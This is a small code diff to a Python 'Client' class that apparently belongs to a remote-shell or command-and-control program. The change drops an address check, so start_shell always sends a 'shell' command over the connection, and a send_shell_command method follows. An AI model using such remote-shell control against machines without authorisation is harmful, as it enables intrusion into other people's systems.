@@ -14,16 +14,12 @@ class Client:
         self.conn.recv(1024)
 
 
-    def start_shell(self, shelladdr):
-        if self.client_addr == shelladdr:
-        #if desired addr = client addr
+    def start_shell(self):
             command = 'shell'
             self.conn.send(command.encode('utf-8'))
+            
             return True
 
-        else:
-            #if desired addr != client addr
-            return False
 
     def send_shell_command(self, command):
         command = command
